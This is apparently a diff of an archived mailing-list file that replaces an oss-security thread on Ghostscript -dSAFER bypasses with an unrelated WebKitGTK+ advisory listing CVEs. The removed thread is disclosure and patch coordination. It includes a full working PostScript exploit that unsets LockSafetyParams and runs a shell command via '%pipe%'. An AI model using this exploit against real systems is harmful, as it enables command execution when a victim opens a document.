@@ -1,305 +1,170 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/09/04/4
-Message-ID: <CAJ_zFk++=BcFw0mU1NefSCkGqo3RzRjePQwPo0mCUzL=QeGBiA@mail.gmail.com>
-Date: Tue, 4 Sep 2018 12:59:23 -0700
-From: Tavis Ormandy <taviso@...gle.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/04/04/3
+Message-Id: <1522867580.22588.1@mail.igalia.com>
+Date: Wed, 04 Apr 2018 13:46:20 -0500
+From: Michael Catanzaro <mcatanzaro@...lia.com>
+To: webkit-gtk@...ts.webkit.org
+Cc: security@...kit.org, distributor-list@...me.org, oss-security@...ts.openwall.com, bugtraq@...urityfocus.com
+Subject: WebKitGTK+ Security Advisory WSA-2018-0003
 Content-Type: text/plain; charset=utf-8
 
-OK, well, the fixes missed 9.24 so vendors will have to either ship patches
-once they land or wait for 9.25.
+------------------------------------------------------------------------
+WebKitGTK+ Security Advisory WSA-2018-0003
+------------------------------------------------------------------------
 
-$ ./gs -v
-GPL Ghostscript 9.24 (2018-09-03)
-Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
-$ ./gs -q -dSAFER -sDEVICE=ppmraw -f testcase.ps
-uid=1000(taviso) gid=1000(taviso)
+Date reported : April 04, 2018
+Advisory ID : WSA-2018-0003
+Advisory URL : https://webkitgtk.org/security/WSA-2018-0003.html
+CVE identifiers : CVE-2018-4101, CVE-2018-4113, CVE-2018-4114,
+                     CVE-2018-4117, CVE-2018-4118, CVE-2018-4119,
+                     CVE-2018-4120, CVE-2018-4122, CVE-2018-4125,
+                     CVE-2018-4127, CVE-2018-4128, CVE-2018-4129,
+                     CVE-2018-4133, CVE-2018-4146, CVE-2018-4161,
+                     CVE-2018-4162, CVE-2018-4163, CVE-2018-4165.
 
-Let me know if anyone wants that testcase.
+Several vulnerabilities were discovered in WebKitGTK+.
 
-Tavis.
+CVE-2018-4101
+    Versions affected: WebKitGTK+ before 2.20.0.
+    Credit to Yuan Deng of Ant-financial Light-Year Security Lab.
+    Impact: Processing maliciously crafted web content may lead to
+    arbitrary code execution. Description: Multiple memory corruption
+    issues were addressed with improved memory handling.
+
+CVE-2018-4113
+    Versions affected: WebKitGTK+ before 2.20.0.
+    Credit to OSS-Fuzz.
+    Impact: Unexpected interaction with indexing types causing an ASSERT
+    failure. Description: An array indexing issue existed in the
+    handling of a function in JavaScriptCore. This issue was addressed
+    through improved checks.
+
+CVE-2018-4114
+    Versions affected: WebKitGTK+ before 2.20.0.
+    Credit to OSS-Fuzz.
+    Impact: Processing maliciously crafted web content may lead to
+    arbitrary code execution. Description: Multiple memory corruption
+    issues were addressed with improved memory handling.
+
+CVE-2018-4117
+    Versions affected: WebKitGTK+ before 2.20.0.
+    Credit to an anonymous researcher.
+    Impact: A malicious website may exfiltrate data cross-origin.
+    Description: A cross-origin issue existed with the fetch API. This
+    was addressed through improved input validation.
+
+CVE-2018-4118
+    Versions affected: WebKitGTK+ before 2.18.1.
+    Credit to Jun Kokatsu (@shhnjk).
+    Impact: Processing maliciously crafted web content may lead to
+    arbitrary code execution. Description: Multiple memory corruption
+    issues were addressed with improved memory handling.
+
+CVE-2018-4119
+    Versions affected: WebKitGTK+ before 2.20.0.
+    Credit to an anonymous researcher working with Trend Micro’s Zero
+    Day Initiative.
+    Impact: Processing maliciously crafted web content may lead to
+    arbitrary code execution. Description: Multiple memory corruption
+    issues were addressed with improved memory handling.
+
+CVE-2018-4120
+    Versions affected: WebKitGTK+ before 2.20.0.
+    Credit to Hanming Zhang (@4shitak4) of Qihoo 360 Vulcan Team.
+    Impact: Processing maliciously crafted web content may lead to
+    arbitrary code execution. Description: Multiple memory corruption
+    issues were addressed with improved memory handling.
+
+CVE-2018-4122
+    Versions affected: WebKitGTK+ before 2.20.0.
+    Credit to WanderingGlitch of Trend Micro's Zero Day Initiative.
+    Impact: Processing maliciously crafted web content may lead to
+    arbitrary code execution. Description: Multiple memory corruption
+    issues were addressed with improved memory handling.
+
+CVE-2018-4125
+    Versions affected: WebKitGTK+ before 2.20.0.
+    Credit to WanderingGlitch of Trend Micro's Zero Day Initiative.
+    Impact: Processing maliciously crafted web content may lead to
+    arbitrary code execution. Description: Multiple memory corruption
+    issues were addressed with improved memory handling.
+
+CVE-2018-4127
+    Versions affected: WebKitGTK+ before 2.20.0.
+    Credit to an anonymous researcher working with Trend Micro’s Zero
+    Day Initiative.
+    Impact: Processing maliciously crafted web content may lead to
+    arbitrary code execution. Description: Multiple memory corruption
+    issues were addressed with improved memory handling.
+
+CVE-2018-4128
+    Versions affected: WebKitGTK+ before 2.20.0.
+    Credit to Zach Markley.
+    Impact: Processing maliciously crafted web content may lead to
+    arbitrary code execution. Description: Multiple memory corruption
+    issues were addressed with improved memory handling.
+
+CVE-2018-4129
+    Versions affected: WebKitGTK+ before 2.20.0.
+    Credit to likemeng of Baidu Security Lab working with Trend Micro's
+    Zero Day Initiative.
+    Impact: Processing maliciously crafted web content may lead to
+    arbitrary code execution. Description: Multiple memory corruption
+    issues were addressed with improved memory handling.
+
+CVE-2018-4133
+    Versions affected: WebKitGTK+ before 2.20.0.
+    Credit to Anton Lopanitsyn of Wallarm, Linus Särud of Detectify
+    (detectify.com), Yuji Tounai of NTT Communications Corporation.
+    Impact: Visiting a maliciously crafted website may lead to a cross-
+    site scripting attack. Description: A cross-site scripting issue
+    existed in WebKit. This issue was addressed with improved URL
+    validation.
+
+CVE-2018-4146
+    Versions affected: WebKitGTK+ before 2.20.0.
+    Credit to OSS-Fuzz.
+    Impact: Processing maliciously crafted web content may lead to a
+    denial of service. Description: A memory corruption issue was
+    addressed through improved input validation.
+
+CVE-2018-4161
+    Versions affected: WebKitGTK+ before 2.20.0.
+    Credit to WanderingGlitch of Trend Micro's Zero Day Initiative.
+    Impact: Processing maliciously crafted web content may lead to
+    arbitrary code execution. Description: Multiple memory corruption
+    issues were addressed with improved memory handling.
+
+CVE-2018-4162
+    Versions affected: WebKitGTK+ before 2.20.0.
+    Credit to WanderingGlitch of Trend Micro's Zero Day Initiative.
+    Impact: Processing maliciously crafted web content may lead to
+    arbitrary code execution. Description: Multiple memory corruption
+    issues were addressed with improved memory handling.
+
+CVE-2018-4163
+    Versions affected: WebKitGTK+ before 2.20.0.
+    Credit to WanderingGlitch of Trend Micro's Zero Day Initiative.
+    Impact: Processing maliciously crafted web content may lead to
+    arbitrary code execution. Description: Multiple memory corruption
+    issues were addressed with improved memory handling.
+
+CVE-2018-4165
+    Versions affected: WebKitGTK+ before 2.20.0.
+    Credit to Hanming Zhang (@4shitak4) of Qihoo 360 Vulcan Team.
+    Impact: Processing maliciously crafted web content may lead to
+    arbitrary code execution. Description: Multiple memory corruption
+    issues were addressed with improved memory handling.
 
 
-On Tue, Sep 4, 2018 at 11:47 AM Tavis Ormandy <taviso@...gle.com> wrote:
+We recommend updating to the last stable version of WebKitGTK+. It is
+the best way of ensuring that you are running a safe version of
+WebKitGTK+. Please check our website for information about the last
+stable releases.
 
-> Thanks Marcus. FWIW, over the weekend upstream fixed all of the bugs I had
-> opened. Just looking this morning and I can see one or two of the fixes
-> were incomplete, I'll file new bugs and hopefully new fixes make it into
-> 9.24 release.
->
-> (I'm only fuzzing with sort -R < postscript_commands.txt | gs -dSAFER, so
-> totally possible we'll have to do this again soon)
->
-> Tavis.
->
-> (p.s. I'm not exaggerating about the sort -R, that's literally how I'm
-> fuzzing it)
->
-> On Mon, Sep 3, 2018 at 3:59 AM Marcus Meissner <meissner@...e.de> wrote:
->
->> Hi,
->>
->> I am still holding back CVE requesting as CERT promised to do this.
->>
->> If they do not reply with a plan until tomorrow I will proceed with
->> requesting.
->>
->> Ciao, Marcus
->> On Wed, Aug 29, 2018 at 01:43:22PM -0700, Tavis Ormandy wrote:
->> > I should note, just add `userdict /setpagedevice undef` at the top if
->> you
->> > want to test it with ImageMagick.
->> >
->> > Tavis.
->> >
->> > On Wed, Aug 29, 2018 at 1:14 PM Tavis Ormandy <taviso@...gle.com>
->> wrote:
->> >
->> > > Thanks Marcus, here are some more necessary commits:
->> > >
->> > >
->> > >
->> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=520bb0ea7519aa3e79db78aaf0589dae02103764
->> > > # 699654 D /invalidaccess checks stop working after a failed restore
->> > >
->> > >
->> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5b5536fa88a9e885032bc0df3852c3439399a5c0
->> > > # 699670 gssetresolution memory corruption
->> > >
->> > >
->> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
->> > > # 699671 handling /undefined results in SEGV
->> > >
->> > >
->> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
->> > > # 699676 PDF interpreter can leave dangerous operators available
->> > >
->> > > Please note that not all issues are resolved, and I have exploits that
->> > > still work against HEAD.
->> > >
->> > > For example, this will still work if you pull master as of this
->> writing:
->> > >
->> > > $ cat testcase.pdf
->> > > %!PS
->> > > % This is ghostscript bug #699687 (split out from bug #699654)
->> > >
->> > > a0 % just select a papersize to initialize page device
->> > >
->> > > % You can't def HWResolution (for example), because currentpagedevice
->> is
->> > > readonly:
->> > > %
->> > > % GS>currentpagedevice wcheck ==
->> > > % false
->> > > %
->> > > % But you can just put or astore into it, because the array itself is
->> > > writable:
->> > > % GS>currentpagedevice /HWResolution get wcheck ==
->> > > % true
->> > > %
->> > > % If you put some junk in there, then grestore stops working.
->> > > currentpagedevice /HWResolution get 0 (foobar) put
->> > >
->> > > % this grestore will fail, `stopped` just handles the error instead of
->> > > aborting.
->> > > { grestore } stopped {} if
->> > >
->> > > % now LockSafetyParams will be incorrectly unset, you can check like
->> this:
->> > > % GS>mark currentdevice getdeviceprops .dicttomark /.LockSafetyParams
->> get
->> > > == pop
->> > > % false
->> > >
->> > > % we can change and configure devices now, so make sure we're using
->> one
->> > > with
->> > > % a OutputFile property.
->> > > (ppmraw) selectdevice
->> > >
->> > > % run a shell command
->> > > mark /OutputFile (%pipe%id) currentdevice putdeviceprops
->> > > showpage
->> > > $ evince testcase.pdf
->> > > uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
->> > > context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
->> > > (libspectre) ghostscript reports: ioerror -12
->> > >
->> > > Tavis.
->> > >
->> > > On Tue, Aug 28, 2018 at 2:26 AM Marcus Meissner <meissner@...e.de>
->> wrote:
->> > >
->> > >> Hi,
->> > >>
->> > >> I had 4 CVEs assigned yesterday afternoon already working from CERTs
->> list,
->> > >> see inline comments below. Please adjust if something is incorrect in
->> > >> them.
->> > >>
->> > >> CERT has mailed overnight that they will take care of the CVE
->> assignment,
->> > >> so
->> > >> I am defering the rest to them.
->> > >>
->> > >> Ciao, Marcus
->> > >>
->> > >> On Mon, Aug 27, 2018 at 04:02:46PM -0700, Tavis Ormandy wrote:
->> > >> > Here is an update, Artifex made a press release
->> > >> > <
->> > >>
->> https://www.darkreading.com/prnewswire2.asp?rkey=20180824UN89145&filter=3930
->> > >> >
->> > >> > listing
->> > >> > some necessary commits, but the list was incomplete.
->> > >> >
->> > >> > Here is a list of relevant commits I'm aware of so far, some
->> issues are
->> > >> > still open with working exploits available. It's my understanding
->> that
->> > >> no
->> > >> > new release is planned until late September, and vendors need to
->> either
->> > >> > ship a git snapshot when all issues are resolved, or apply
->> patches. I
->> > >> have
->> > >> > testcases for each problem, but I think the bugs will be visible
->> > >> eventually
->> > >> > so I'm not posting them here.
->> > >> >
->> > >> >
->> > >>
->> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
->> > >> > # 699671
->> > >> > handling /undefined results in SEGV
->> > >> >
->> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0edd3d6c63
->> > >> > # 699659 missing type check in ztype
->> > >> >
->> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=78911a01b6 #
->> > >> > 699654 A /invalidaccess checks stop working after a failed restore
->> > >> >
->> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5516c614dc33
->> > >> #
->> > >> > 699654 B /invalidaccess checks stop working after a failed restore
->> > >> >
->> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=79cccf641486
->> > >> #
->> > >> > 699654 C /invalidaccess checks stop working after a failed restore
->> > >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b326a716
->> #
->> > >> 699655
->> > >> > - missing type checking in setcolor
->> > >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c3476dde
->> #
->> > >> 699656
->> > >>
->> > >>
->> > >> > - LockDistillerParams boolean missing type checks
->> > >> >
->> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=a054156d42
->> > >>         CVE-2018-15910
->> > >>
->> > >>
->> > >> > # 699658 - Bypassing PermitFileReading by handling
->> undefinedfilename
->> > >> errors
->> > >>
->> > >>
->> > >> >
->> > >>
->> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0b6cd1918e1ec4ffd087400a754a845180a4522b
->> > >> > # 699660 - shading_param incomplete type checking
->> > >> >
->> > >>
->> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=e01e77a36cbb2e0277bc3a63852244bec41be0f6
->> > >> > # 699660 - shading_param incomplete type checking
->> > >>         CVE-2018-15909
->> > >>
->> > >>
->> > >> >
->> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c432131c3f
->> > >> > # 699661 - pdf14 garbage collection memory corruption
->> > >> >
->> > >>
->> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=971472c83a345a16dac9f90f91258bb22dd77f22
->> > >> > # 699663 - .setdistillerkeys memory corruption
->> > >> >
->> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=241d911127
->> > >> > # 699664 - corrupt device object after error in job
->> > >>
->> > >>
->> > >> >
->> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0d3901189f
->> > >> > # 699657 - .tempfile SAFER restrictions seem to be broken
->> > >>         CVE-2018-15908
->> > >>
->> > >> >
->> > >>
->> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=8e9ce5016db968b40e4ec255a3005f2786cce45f
->> > >>
->> > >>
->> > >> > # 699665 - memory corruption in aesdecode
->> > >> >
->> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b575e1ec42
->> > >>
->> > >>         CVE-2018-15911
->> > >>
->> > >> > # 699668 - .definemodifiedfont memory corruption if /typecheck is
->> > >> handled
->> > >> >
->> > >> > Tavis
->> > >> >
->> > >> > On Thu, Aug 23, 2018 at 8:05 AM Bob Friesenhahn <
->> > >> > bfriesen@...ple.dallas.tx.us> wrote:
->> > >> >
->> > >> > > On Thu, 23 Aug 2018, Leonardo Taccari wrote:
->> > >> > > >
->> > >> > > > (Regarding the `file.ps2' and `file.ps3' examples without
->> `PS2:' or
->> > >> > > > `PS3:' prefixes according `convert -debug Policy -log "%e"' it
->> seems
->> > >> > > > that they ends up as:
->> > >> > > >
->> > >> > > > Domain: Coder; rights=Read; pattern="PS" ...
->> > >> > > >
->> > >> > > > ...so should be blocked by the workaround described in
->> > >> > > > VU#332928. But please correct me if I'm wrong.)
->> > >> > >
->> > >> > > This is likely due to header magic detection (e.g.
->> "%!PS-Adobe").  It
->> > >> > > is possible that a different path will be taken if the common
->> > >> > > Postscript header is not detected.  The file extension may then
->> be
->> > >> > > used as a hint.  Also, there are a wide varieties of ImageMagick
->> > >> > > versions in use, with a wide variety of behaviors.
->> > >> > >
->> > >> > > The version of ImageMagick provided by the Ubuntu Linux I am
->> using at
->> > >> > > this moment dates from 2012!
->> > >> > >
->> > >> > > Bob
->> > >> > > --
->> > >> > > Bob Friesenhahn
->> > >> > > bfriesen@...ple.dallas.tx.us,
->> > >> http://www.simplesystems.org/users/bfriesen/
->> > >> > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
->> > >> > >
->> > >>
->> > >> --
->> > >> Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409
->> Nuernberg; Zi.
->> > >> 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <
->> > >> meissner@...e.de>
->> > >>
->> > >
->>
->> --
->> Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi.
->> 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <
->> meissner@...e.de>
->>
->
+Further information about WebKitGTK+ Security Advisories can be found
+at: https://webkitgtk.org/security.html
+
+The WebKitGTK+ team,
+April 04, 2018
 
